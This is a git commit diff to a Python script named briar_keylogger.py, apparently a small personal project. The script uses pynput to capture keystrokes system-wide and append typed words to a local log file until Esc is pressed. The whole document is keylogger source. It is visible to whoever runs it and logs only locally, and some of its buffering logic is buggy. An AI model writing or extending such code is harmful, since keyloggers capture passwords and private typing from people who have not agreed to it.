c3ef928f0ee6afc1516d3f7f5cfacd869c55d23a
alister00 <akaristr@protonmail.com>
2026-01-07 18:37:38 -0500

    errores que pausaban el programa

--- briar_keylogger.py
+++ briar_keylogger.py
@@ -1,50 +1,62 @@
 from pynput import keyboard
 
-texto = ""
+log_file = "loggin.txt"
+current_word = ""
+
+def log(word):
+    with open(log_file, "a", encoding="utf-8") as f:
+        f.write(word)
 
 def on_press(key):
-    global texto
+    global current_word
     try:
-        texto += key.char
+        if key.char is not None:
+            current_word += key.char
     
     except AttributeError:
         if key == keyboard.Key.space:
-            texto += " "
+            if current_word:
+                log(current_word)
+                current_word = ""
+
         elif key == keyboard.Key.enter:
-            texto += "\n"
+            if current_word:
+                log(current_word)
+                current_word += "\n"
+
         elif key == keyboard.Key.tab:
-            texto += "\t"
+            if current_word:
+                log(current_word)
+                current_word += "\t"
 
         elif key == keyboard.Key.shift:
             pass
         elif key == keyboard.Key.alt:
             pass
         
-        elif key == keyboard.Key.backspace and len(texto) == 0:
+        elif key == keyboard.Key.backspace and len(current_word) == 0:
             pass
-        elif key == keyboard.Key.backspace and len(texto) > 0:
-            texto = texto[:-1]
-        pass
+        elif key == keyboard.Key.backspace and len(current_word) > 0:
+            current_word = current_word[:-1]
 
 def on_release(key):
     if key == keyboard.Key.esc:
+        if current_word:
+            log(current_word)
         return False
 
 print("Escuchando... Presiona teclas para capturar")
 print("Presiona 'Esc' para parar y ver las palabras.")
 
 with keyboard.Listener(
-        on_press=on_press,
-        on_release=on_release
-        ) as listener:
+    on_press=on_press,
+    on_release=on_release
+    ) as listener:
     listener.join()
 
-with open("teclas.txt", "w") as outputfile:
-    outputfile.write(texto)
-
-palabras = texto.split()
+words = current_word.split()
 
 
 print("\n--- Texto Capturado ---")
-print(f"Número de palabras: {len(palabras)}")
-print(f"{texto}")
+print(f"Número de palabras: {len(words)}")
+print(f"{current_word}")
